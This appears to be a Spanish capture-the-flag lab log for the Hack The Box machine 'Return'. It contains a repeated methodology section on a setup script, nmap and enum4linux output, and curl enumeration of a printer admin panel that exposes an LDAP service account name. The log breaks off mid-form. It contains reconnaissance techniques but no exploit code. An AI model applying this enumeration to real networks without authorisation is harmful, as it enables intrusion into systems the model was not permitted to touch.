El siguiente bloque conserva las notas operativas originales del caso para trazabilidad documental. El cuerpo principal del documento ya contiene una versión consolidada, ordenada y didáctica de la resolución.

---


### Iniciamos la máquina Return de Hack The Box.

## Preparación inicial automatizada

Al comenzar la máquina se ejecuta el script propio `Inici-HTB`, utilizado para preparar el entorno de trabajo y realizar una primera enumeración técnica controlada.

```bash
Inici-HTB <NOMBRE_MAQUINA> <IP_OBJETIVO>
```

Este script no explota nada. Su función es dejar el laboratorio ordenado desde el primer minuto, validar conectividad y generar una base mínima de evidencias para decidir la siguiente rama de trabajo.

---

## Qué prepara el script

`Inici-HTB` crea una estructura de trabajo separada para la máquina, con directorios destinados a organizar la enumeración, el contenido descargado, posibles pruebas posteriores y notas del caso.

Estructura genérica esperada:

```text
<directorio_maquina>/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

---

## Finalidad de cada directorio

### `content/`

Directorio reservado para material obtenido durante la enumeración o el análisis posterior:

- páginas descargadas;
- ficheros públicos;
- respuestas HTTP;
- artefactos útiles;
- resultados de herramientas específicas;
- documentación o evidencias relevantes.

### `exploits/`

Directorio reservado para pruebas o material de explotación usado por el operador del laboratorio, cuando proceda.

No se utiliza en la fase inicial salvo que más adelante se confirme una vía concreta y justificada.

### `nmap/`

Directorio donde se guardan las evidencias de conectividad y enumeración inicial.

Archivos principales:

- `ping.txt`  
  Guarda la comprobación inicial de conectividad contra la IP objetivo.

- `whichSystem.txt`  
  Guarda la estimación inicial del sistema operativo, normalmente a partir de TTL u otras señales tempranas.

- `allPorts`  
  Guarda el resultado del escaneo completo de puertos TCP abiertos.

- `extractPorts.txt`  
  Guarda la extracción de puertos abiertos para reutilizarlos en el escaneo de servicios.

- `nmap_tcp_services.txt`  
  Guarda el escaneo detallado de servicios, versiones y scripts básicos sobre los puertos abiertos.

### `notes/`

Directorio donde se crean notas iniciales del caso.

Archivos generados:

- `00_resumen_inicial.md`  
  Resume los datos iniciales de la máquina: IP, fecha, sistema estimado, puertos abiertos, servicios detectados, superficie dominante sugerida, ramas secundarias y siguiente paso único.

- `01_siguiente_paso.txt`  
  Guarda de forma aislada el siguiente paso recomendado para continuar con el roadmap correspondiente.

---

## Qué ejecuta el script de forma resumida

El flujo automatizado realiza estas acciones:

1. registra el objetivo de trabajo;
2. prepara el árbol de directorios;
3. valida conectividad con `ping`;
4. estima el sistema operativo con `whichSystem.py`;
5. ejecuta un escaneo completo de puertos TCP;
6. extrae los puertos abiertos;
7. ejecuta un escaneo de servicios sobre esos puertos;
8. infiere una superficie dominante inicial;
9. propone ramas secundarias;
10. genera un resumen inicial;
11. deja escrito un siguiente paso único.

---

## Lectura didáctica del arranque

El objetivo de esta fase no es encontrar ya la vulnerabilidad principal, sino evitar empezar el caso de forma desordenada.

La ejecución de `Inici-HTB` permite responder rápidamente a preguntas básicas:

- ¿el objetivo responde?
- ¿qué puertos están abiertos?
- ¿qué servicios están expuestos?
- ¿hay una web dominante?
- ¿parece un entorno Linux o Windows?
- ¿aparece SSH, SMB, FTP, HTTP u otro servicio relevante?
- ¿qué rama del roadmap tiene más sentido abrir primero?

---

## Evidencia inicial que se debe revisar después del script

Tras ejecutar `Inici-HTB`, se revisan especialmente estos archivos:

```bash
cat nmap/ping.txt
cat nmap/whichSystem.txt
cat nmap/extractPorts.txt
cat nmap/nmap_tcp_services.txt
cat notes/00_resumen_inicial.md
cat notes/01_siguiente_paso.txt
```

La revisión no debe limitarse a mirar puertos. Hay que interpretar qué superficie domina el caso y qué rama merece prioridad.

---
# Modelo de inicio — Ejecución de `Inici-HTB`

## Preparación inicial automatizada

Al comenzar la máquina se ejecuta el script propio `Inici-HTB`, utilizado para preparar el entorno de trabajo y realizar una primera enumeración técnica controlada.

```bash
Inici-HTB <NOMBRE_MAQUINA> <IP_OBJETIVO>
```

Este script no explota nada. Su función es dejar el laboratorio ordenado desde el primer minuto, validar conectividad y generar una base mínima de evidencias para decidir la siguiente rama de trabajo.

---

## Qué prepara el script

`Inici-HTB` crea una estructura de trabajo separada para la máquina, con directorios destinados a organizar la enumeración, el contenido descargado, posibles pruebas posteriores y notas del caso.

Estructura genérica esperada:

```text
<directorio_maquina>/
├── content/
├── exploits/
├── nmap/
│   ├── allPorts
│   ├── extractPorts.txt
│   ├── nmap_tcp_services.txt
│   ├── ping.txt
│   └── whichSystem.txt
└── notes/
    ├── 00_resumen_inicial.md
    └── 01_siguiente_paso.txt
```

---

## Finalidad de cada directorio

### `content/`

Directorio reservado para material obtenido durante la enumeración o el análisis posterior:

- páginas descargadas;
- ficheros públicos;
- respuestas HTTP;
- artefactos útiles;
- resultados de herramientas específicas;
- documentación o evidencias relevantes.

### `exploits/`

Directorio reservado para pruebas o material de explotación usado por el operador del laboratorio, cuando proceda.

No se utiliza en la fase inicial salvo que más adelante se confirme una vía concreta y justificada.

### `nmap/`

Directorio donde se guardan las evidencias de conectividad y enumeración inicial.

Archivos principales:

- `ping.txt`  
  Guarda la comprobación inicial de conectividad contra la IP objetivo.

- `whichSystem.txt`  
  Guarda la estimación inicial del sistema operativo, normalmente a partir de TTL u otras señales tempranas.

- `allPorts`  
  Guarda el resultado del escaneo completo de puertos TCP abiertos.

- `extractPorts.txt`  
  Guarda la extracción de puertos abiertos para reutilizarlos en el escaneo de servicios.

- `nmap_tcp_services.txt`  
  Guarda el escaneo detallado de servicios, versiones y scripts básicos sobre los puertos abiertos.

### `notes/`

Directorio donde se crean notas iniciales del caso.

Archivos generados:

- `00_resumen_inicial.md`  
  Resume los datos iniciales de la máquina: IP, fecha, sistema estimado, puertos abiertos, servicios detectados, superficie dominante sugerida, ramas secundarias y siguiente paso único.

- `01_siguiente_paso.txt`  
  Guarda de forma aislada el siguiente paso recomendado para continuar con el roadmap correspondiente.

---

## Qué ejecuta el script de forma resumida

El flujo automatizado realiza estas acciones:

1. registra el objetivo de trabajo;
2. prepara el árbol de directorios;
3. valida conectividad con `ping`;
4. estima el sistema operativo con `whichSystem.py`;
5. ejecuta un escaneo completo de puertos TCP;
6. extrae los puertos abiertos;
7. ejecuta un escaneo de servicios sobre esos puertos;
8. infiere una superficie dominante inicial;
9. propone ramas secundarias;
10. genera un resumen inicial;
11. deja escrito un siguiente paso único.

---

## Lectura didáctica del arranque

El objetivo de esta fase no es encontrar ya la vulnerabilidad principal, sino evitar empezar el caso de forma desordenada.

La ejecución de `Inici-HTB` permite responder rápidamente a preguntas básicas:

- ¿el objetivo responde?
- ¿qué puertos están abiertos?
- ¿qué servicios están expuestos?
- ¿hay una web dominante?
- ¿parece un entorno Linux o Windows?
- ¿aparece SSH, SMB, FTP, HTTP u otro servicio relevante?
- ¿qué rama del roadmap tiene más sentido abrir primero?

---

## Evidencia inicial que se debe revisar después del script

Tras ejecutar `Inici-HTB`, se revisan especialmente estos archivos:

```bash
cat nmap/ping.txt
cat nmap/whichSystem.txt
cat nmap/extractPorts.txt
cat nmap/nmap_tcp_services.txt
cat notes/00_resumen_inicial.md
cat notes/01_siguiente_paso.txt
```

La revisión no debe limitarse a mirar puertos. Hay que interpretar qué superficie domina el caso y qué rama merece prioridad.

---

## Criterio de decisión tras el arranque

La salida correcta de esta fase debe ser una decisión clara:

```text
Superficie dominante:
Rama principal:
Ramas secundarias:
Siguiente paso único:
```

Ejemplos de decisión:

- si domina HTTP/HTTPS → continuar con `WEB-BASE`;
- si aparece login o panel claro → valorar `WEB-AUTH / PANEL`;
- si aparecen SMB, Kerberos, LDAP y dominio → valorar rama `AD / SMB / KERBEROS`;
- si aparece una credencial reutilizable → valorar `CREDENCIALES`;
- si SSH queda abierto pero sin credenciales → dejarlo como rama secundaria.

---

## Nota metodológica

`Inici-HTB` no sustituye al análisis manual.

Su valor está en dejar el inicio de la máquina ordenado, repetible y documentado. A partir de sus resultados se debe revisar la evidencia, confirmar la superficie dominante y continuar con el roadmap correspondiente.

La regla principal es:

```text
no explotar por intuición;
decidir por evidencia observada.
```
## Criterio de decisión tras el arranque

La salida correcta de esta fase debe ser una decisión clara:

```text
Superficie dominante:
Rama principal:
Ramas secundarias:
Siguiente paso único:
```

Ejemplos de decisión:

- si domina HTTP/HTTPS → continuar con `WEB-BASE`;
- si aparece login o panel claro → valorar `WEB-AUTH / PANEL`;
- si aparecen SMB, Kerberos, LDAP y dominio → valorar rama `AD / SMB / KERBEROS`;
- si aparece una credencial reutilizable → valorar `CREDENCIALES`;
- si SSH queda abierto pero sin credenciales → dejarlo como rama secundaria.

---

## Nota metodológica

`Inici-HTB` no sustituye al análisis manual.

Su valor está en dejar el inicio de la máquina ordenado, repetible y documentado. A partir de sus resultados se debe revisar la evidencia, confirmar la superficie dominante y continuar con el roadmap correspondiente.

La regla principal es:

no explotar por intuición;
decidir por evidencia observada.

### ❯ Inici-HTB Return 10.129.95.241 easy
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.95.241 (10.129.95.241) 56(84) bytes of data.
64 bytes from 10.129.95.241: icmp_seq=1 ttl=127 time=48.3 ms

--- 10.129.95.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.342/48.342/48.342/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.95.241 (ttl -> 127): Windows

[*] Lanzando escaneo completo de puertos
[sudo] contraseña para r4mon: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-08 13:52 CEST
Initiating SYN Stealth Scan at 13:53
Scanning 10.129.95.241 [65535 ports]
Discovered open port 53/tcp on 10.129.95.241
Discovered open port 445/tcp on 10.129.95.241
Discovered open port 139/tcp on 10.129.95.241
Discovered open port 80/tcp on 10.129.95.241
Discovered open port 135/tcp on 10.129.95.241
Discovered open port 88/tcp on 10.129.95.241
Discovered open port 49723/tcp on 10.129.95.241
Discovered open port 49697/tcp on 10.129.95.241
Discovered open port 49666/tcp on 10.129.95.241
Discovered open port 49678/tcp on 10.129.95.241
Discovered open port 464/tcp on 10.129.95.241
Discovered open port 593/tcp on 10.129.95.241
Discovered open port 49674/tcp on 10.129.95.241
Discovered open port 49671/tcp on 10.129.95.241
Discovered open port 49664/tcp on 10.129.95.241
Discovered open port 47001/tcp on 10.129.95.241
Discovered open port 49675/tcp on 10.129.95.241
Discovered open port 49665/tcp on 10.129.95.241
Discovered open port 9389/tcp on 10.129.95.241
Discovered open port 5985/tcp on 10.129.95.241
Discovered open port 49681/tcp on 10.129.95.241
Discovered open port 389/tcp on 10.129.95.241
Discovered open port 3269/tcp on 10.129.95.241
Discovered open port 3268/tcp on 10.129.95.241
Discovered open port 49668/tcp on 10.129.95.241
Discovered open port 636/tcp on 10.129.95.241
Completed SYN Stealth Scan at 13:53, 12.46s elapsed (65535 total ports)
Nmap scan report for 10.129.95.241
Host is up, received user-set (0.047s latency).
Scanned at 2026-05-08 13:53:00 CEST for 12s
Not shown: 65440 closed tcp ports (reset), 69 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
49723/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds
           Raw packets sent: 66963 (2.946MB) | Rcvd: 65466 (2.619MB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49678,49681,49697,49723
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-08 13:53 CEST
Nmap scan report for 10.129.95.241
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-08 12:11:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-08T12:12:51
|_  start_date: N/A
|_clock-skew: 18m33s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.22 seconds
[*] Resumen inicial generado en: /home/r4mon/pentest/targets/HTB/easy/Return/notes/00_resumen_inicial.md
[*] Siguiente paso generado en: /home/r4mon/pentest/targets/HTB/easy/Return/notes/01_siguiente_paso.txt
[*] Flujo inicial completado

### Objetivo

Cerrar la fase inicial de Return con una decisión de ruta clara y avanzar hacia la primera validación útil: revisar el panel web de impresora expuesto en IIS y comprobar si revela configuración reutilizable.

### Hechos verificados

La máquina responde correctamente en `10.129.95.241`.

La estimación inicial por TTL indica Windows:

```text
10.129.95.241 (ttl -> 127): Windows
```

El escaneo completo detecta una superficie Windows/Active Directory clara, con puertos relevantes:

```text
53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001
```

El escaneo de servicios confirma:

```text
80/tcp    Microsoft IIS httpd 10.0
http-title: HTB Printer Admin Panel

88/tcp    Microsoft Windows Kerberos
389/tcp   Microsoft Windows Active Directory LDAP
445/tcp   microsoft-ds
5985/tcp  Microsoft HTTPAPI httpd 2.0
9389/tcp  .NET Message Framing
```

El host se identifica como:

```text
Host: PRINTER
OS: Windows
Domain: return.local
```

SMB tiene firma requerida:

```text
Message signing enabled and required
```

Existe desfase horario observado:

```text
clock-skew: 18m33s
```

### Suposiciones

El puerto `80` no parece una web genérica, sino una aplicación concreta: un panel de administración de impresora.

La presencia de LDAP, Kerberos, SMB, WinRM y ADWS indica contexto de dominio, pero el hallazgo más accionable ahora mismo es el panel web `HTB Printer Admin Panel`.

WinRM queda como rama secundaria importante, pero todavía no hay credenciales validadas para usarlo.

SMB queda como rama secundaria de enumeración, especialmente para confirmar dominio, sesiones nulas o ausencia de acceso anónimo.

### Método

La fase 1 queda cerrada así:

```text
Superficie dominante:
Windows / Active Directory con panel web IIS de impresora en el puerto 80.

Rama principal:
WEB-BASE orientada a panel de administración de impresora.

Ramas secundarias:
AD / SMB / LDAP / Kerberos.
WinRM pendiente de credenciales.
SMB pendiente de comprobar acceso anónimo o información de dominio.

Siguiente paso único:
Enumerar de forma controlada el panel web, especialmente rutas de configuración como Settings, para identificar si expone servidor LDAP, usuario de servicio, dominio o parámetros de autenticación.
```

La razón de priorizar el panel web es que el título HTTP ya identifica una aplicación concreta:

```text
HTB Printer Admin Panel
```

En una máquina con servicios de dominio, un panel de impresora puede tener valor porque estos dispositivos suelen almacenar configuración de directorio, servidor LDAP, usuarios de servicio o rutas de red.

### Respuesta

El hallazgo dominante actual es:

```text
IIS expone un panel de administración de impresora en un entorno unido a dominio.
```

La rama principal activa será:

```text
WEB-BASE → revisión del panel de impresora
```

Las ramas secundarias anotadas quedan así:

```text
AD / SMB / LDAP / Kerberos:
Presente por el conjunto de puertos y dominio return.local.

WinRM:
Disponible en 5985, pero pendiente de credenciales.

SMB:
Presente en 445 con firma requerida; falta comprobar si permite enumeración útil sin credenciales.
```

No toca todavía intentar acceso remoto ni explotación. Primero hay que extraer evidencia del panel: rutas, formularios, campos, usuarios visibles, servidor configurado, puerto LDAP o cualquier dato de dominio.

### Comandos

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Return
```

```bash
enum4linux -a 10.129.95.241 | tee content/enum4linux_return.txt
```

Este comando sirve para comprobar si SMB ofrece información básica de dominio, usuarios o sesiones nulas. La parte importante de la salida será si confirma el dominio `RETURN` / `return.local` y si permite o no acceso anónimo.

```bash
curl -sS -D content/http_root_headers.txt http://10.129.95.241/ -o content/http_root.html
```

Este comando descarga la página principal y separa cabeceras de cuerpo HTML. Interesa confirmar título, tecnología, enlaces internos y si el panel tiene rutas como `Settings`, `Fax` o `Troubleshooting`.

```bash
grep -Ei 'href|settings|printer|ldap|server|username|password|domain|port' content/http_root.html
```

Este filtrado busca referencias útiles dentro del HTML inicial. Lo importante no es encontrar muchas rutas, sino localizar la ruta de configuración o campos relacionados con LDAP/dominio.

```bash
curl -sS -D content/http_settings_headers.txt http://10.129.95.241/settings -o content/http_settings.html
```

Este comando intenta descargar directamente la ruta `settings`. La señal útil será si devuelve una página con formulario de configuración, campos de servidor, puerto, usuario o contraseña enmascarada.

```bash
grep -Ei 'server|address|port|user|username|password|domain|ldap|smb|printer|value=' content/http_settings.html
```

Este filtrado extrae los campos relevantes del formulario. Si aparecen servidor LDAP, puerto `389`, usuario de servicio o dominio, esa será la evidencia que justifique pasar de WEB-BASE a análisis de configuración expuesta.

### Comprobaciones

La siguiente respuesta debe traer una de estas evidencias:

```text
Salida relevante de enum4linux.
HTML o captura textual de la página principal.
HTML o campos relevantes de /settings.
Cualquier usuario, dominio, servidor, puerto o contraseña enmascarada visible en el panel.
```

Criterio de decisión siguiente:

```text
Si /settings revela servidor LDAP, usuario o puerto:
la rama principal pasa a configuración expuesta del panel de impresora.

Si SMB permite sesión nula útil:
se mantiene AD / SMB como rama secundaria fuerte.

Si el panel no revela configuración:
se continuará WEB-BASE con rutas del panel y revisión de formularios.

Si aparece una credencial reutilizable:
se cambia a CREDENCIALES y se valida contra servicios disponibles, especialmente WinRM.
```
### Ejecutamos:

❯ enum4linux -a 10.129.95.241 | tee content/enum4linux_return.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri May  8 17:50:03 2026

 =========================================( Target Information )=========================================

Target ........... 10.129.95.241
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.95.241 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.129.95.241 )===============================

Looking up status of 10.129.95.241
No reply from 10.129.95.241

 ===================================( Session Check on 10.129.95.241 )===================================


[+] Server 10.129.95.241 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.129.95.241 )================================

Domain Name: RETURN
Domain Sid: S-1-5-21-3750359090-2939318659-876128439

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.129.95.241 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.129.95.241 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.129.95.241 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.129.95.241 )=================================

do_connect: Connection to 10.129.95.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.95.241


 ===========================( Password Policy Information for 10.129.95.241 )===========================


[E] Unexpected error from polenum:



[+] Attaching to 10.129.95.241 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.129.95.241)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 10.129.95.241 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.129.95.241 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.129.95.241 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri May  8 17:50:34 2026

❯ curl -sS -D content/http_root_headers.txt http://10.129.95.241/ -o content/http_root.html
❯ grep -Ei 'href|settings|printer|ldap|server|username|password|domain|port' content/http_root.html
  <title>HTB Printer Admin Panel</title>
@import url("https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap");
@import url("https://fonts.googleapis.com/css2?family=Exo+2:ital,wght@0,300;0,400;0,500;0,600;1,200&display=swap");
  -webkit-appearance: none !important;
  outline: 0 !important;
  display: none !important;
html.contrastColors .accessibility-panel-settings__filter-icon-box:focus,
html.contrastColors .accessibility-panel-settings__icon-box:focus {
html.contrastColors .accessibility-panel-settings__filter-icon-box:focus img,
html.contrastColors .accessibility-panel-settings__icon-box:focus img {
            <a class="mobile-menu-button" href="javascript:void(0)" data-burger-btn="">
                                <a href="index.php" data-link="true">Home</a>
                                <a href="settings.php" data-link="true">Settings</a>
                                <a href="javascript:void(0)" data-link="true">Fax</a>
                                <a href="javascript:void(0)" data-link="true">Troubleshooting</a>
    </div><center><h2><br/>HTB Printer Admin Panel</h2><br/>
❯ curl -sS -D content/http_settings_headers.txt http://10.129.95.241/settings -o content/http_settings.html
❯ grep -Ei 'server|address|port|user|username|password|domain|ldap|smb|printer|value=' content/http_settings.html
<div id="header"><h1>Server Error</h1></div>

### Objetivo

Corregir la enumeración web inicial y continuar con la revisión del panel de administración de impresora, ya que la ruta útil detectada en el HTML no es `/settings`, sino `settings.php`.

### Hechos verificados

`enum4linux` confirma que el host pertenece al dominio `RETURN`:

```text
Domain Name: RETURN
Domain Sid: S-1-5-21-3750359090-2939318659-876128439
[+] Host is part of a domain (not a workgroup)
```

La enumeración SMB sin credenciales tiene alcance limitado. Aunque aparece una sesión inicial permitida, las consultas útiles fallan por falta de permisos:

```text
NT_STATUS_ACCESS_DENIED
```

No se han obtenido usuarios, shares útiles, política de contraseñas ni RID cycling por SMB anónimo.

La página principal confirma el panel:

```html
<title>HTB Printer Admin Panel</title>
```

El HTML revela una ruta concreta de configuración:

```html
<a href="settings.php" data-link="true">Settings</a>
```

La prueba contra `/settings` no valida la ruta correcta y devuelve error de servidor:

```html
<div id="header"><h1>Server Error</h1></div>
```

### Suposiciones

SMB confirma contexto de dominio, pero no ofrece todavía una vía útil sin credenciales.

El panel web sigue siendo la rama principal porque expone una sección `Settings` y puede contener configuración de conexión a servicios internos del dominio.

El error en `/settings` no descarta la vía web. Solo indica que se probó una ruta distinta a la enlazada por la aplicación.

### Método

El hallazgo dominante actual es:

```text
Panel IIS de impresora con ruta de configuración settings.php identificada.
```

La rama principal activa sigue siendo:

```text
WEB-BASE → panel de administración de impresora → revisión de configuración
```

Las ramas secundarias quedan así:

```text
AD / SMB / LDAP / Kerberos:
Confirmada por dominio RETURN y servicios de directorio, pero pendiente de credenciales.

SMB:
Enumeración anónima limitada; sin usuarios ni shares útiles por ahora.

WinRM:
Puerto disponible, pendiente de credenciales válidas.
```

El siguiente paso único es solicitar la ruta real `settings.php` y extraer los campos del formulario. Lo importante será comprobar si aparecen servidor, puerto, usuario, dominio o contraseña enmascarada asociados a LDAP o SMB.

### Respuesta

La decisión correcta ahora es no insistir en `/settings` ni abrir nuevas ramas todavía.

El HTML ya ha dado una señal concreta:

```text
settings.php
```

Por tanto, toca revisar esa página exacta. Si muestra campos como `Server Address`, `Server Port`, `Username` o `Password`, el panel habrá pasado de ser una simple web a una fuente de configuración sensible.

En ese caso, la siguiente decisión dependerá de si la aplicación permite modificar el servidor LDAP o SMB configurado. Antes de plantear cualquier acción, primero hay que observar y documentar los campos reales.

### Comandos

```bash
curl -sS -D content/http_settings_php_headers.txt http://10.129.95.241/settings.php -o content/http_settings_php.html
```

Este comando solicita la ruta correcta enlazada por la aplicación. Interesa comprobar si devuelve un formulario de configuración y qué campos contiene.

```bash
grep -Ei 'server|address|port|user|username|password|domain|ldap|smb|printer|value=|input|form|update' content/http_settings_php.html
```

Este filtrado busca los elementos relevantes del formulario. La parte útil será cualquier campo `input`, `value`, nombre de usuario, servidor interno o puerto.

```bash
sed -n '/<form/,/<\/form>/p' content/http_settings_php.html
```

Este comando extrae el formulario completo si existe. Es más preciso que el `grep`, porque permite ver método HTTP, acción del formulario y nombres exactos de los parámetros.

```bash
cat content/http_settings_php_headers.txt
```

Sirve para revisar el código HTTP y confirmar si la página responde correctamente. Interesan especialmente `200 OK`, cookies, servidor y redirecciones.

### Comprobaciones

La siguiente evidencia que debe quedar registrada es:

```text
Código HTTP de settings.php.
Formulario completo si existe.
Campos visibles del formulario.
Valores preconfigurados.
Método HTTP usado por el formulario.
Acción del formulario.
Usuario, dominio, servidor o puerto que aparezcan.
```

Criterio de decisión siguiente:

```text
Si settings.php expone configuración LDAP o SMB:
la rama principal pasa a configuración sensible del panel.

Si aparece un usuario de servicio:
se anota como candidato de credencial, todavía sin validar.

Si el formulario permite modificar servidor o puerto:
se revisará el flujo de actualización antes de cualquier acción.

Si settings.php no contiene configuración útil:
se continuará con rutas del panel y búsqueda controlada de otros formularios.
```
### Ejecutamos:

❯ curl -sS -D content/http_settings_php_headers.txt http://10.129.95.241/settings.php -o content/http_settings_php.html
❯ grep -Ei 'server|address|port|user|username|password|domain|ldap|smb|printer|value=|input|form|update' content/http_settings_php.html
  <title>HTB Printer Admin Panel</title>
@import url("https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap");
@import url("https://fonts.googleapis.com/css2?family=Exo+2:ital,wght@0,300;0,400;0,500;0,600;1,200&display=swap");
  -webkit-appearance: none !important;
  outline: 0 !important;
input,
input {
  text-transform: none;
input[type=radio],
input[type=checkbox] {
input[type=date],
input[type=time],
input[type=datetime-local],
input[type=month] {
  display: none !important;
input:focus,
input:active,
  transform: translateX(-100%);
    transform: none;
  transform: translateX(0);
  transform: rotate(225deg);
  transform: rotate(45deg) translate(0, -50%);
  transform: translateX(300%);
  transform: translateX(0);
    transform: none;
html.contrastColors .input-with-button__input {
html.contrastColors .custom-select__input {
html.contrastColors .section-articles__selects .input-select__selected {
html.contrastColors .input-select__item-link {
html.contrastColors .input-select__item-link:hover {
  transform: rotate(-45deg);
  transform: rotate(45deg);
    	<br/><br/><form action="" method="POST">
            <td>Server Address</td>
            <td><input type="text" name="ip" value="printer.return.local"/></td>
            <td>Server Port</td>
            <td><input type="text" value="389"/></td>
            <td>Username</td>
            <td><input type="text" value="svc-printer"/></td>
            <td>Password</td>
            <td><input type="text" value="*******"/></td>
            <td colspan="3"><input type="submit" value="Update"/></td>
      </form>
❯ sed -n '/<form/,/<\/form>/p' content/http_settings_php.html
    	<br/><br/><form action="" method="POST">
        <table>
          <tr>
            <td>Server Address</td>
            <td><input type="text" name="ip" value="printer.return.local"/></td>
          </tr>
          <tr>
            <td>Server Port</td>
            <td><input type="text" value="389"/></td>
          </tr>
          <tr>
